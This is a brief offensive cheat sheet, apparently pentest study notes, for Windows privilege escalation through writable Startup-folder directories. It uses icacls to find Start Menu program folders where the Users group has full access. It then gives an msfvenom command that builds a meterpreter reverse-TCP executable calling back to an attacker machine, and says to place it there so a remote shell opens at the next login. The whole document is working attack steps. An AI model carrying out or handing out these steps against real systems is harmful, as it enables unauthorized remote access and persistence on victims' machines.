## StartUp Applications

### Recon
- To check for access in startup-apps (PowerUp doesn't work here, sometimes need to manually see) :
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\<prog dir name>"
```
- Look for apps where “BUILTIN\Users” group has full access ‘(F)’ to the directory.

### Execution
- Make a rev-shell exe:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
```
- Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\<prog dir name>”.
- Get a rev shell when new login/restart. 
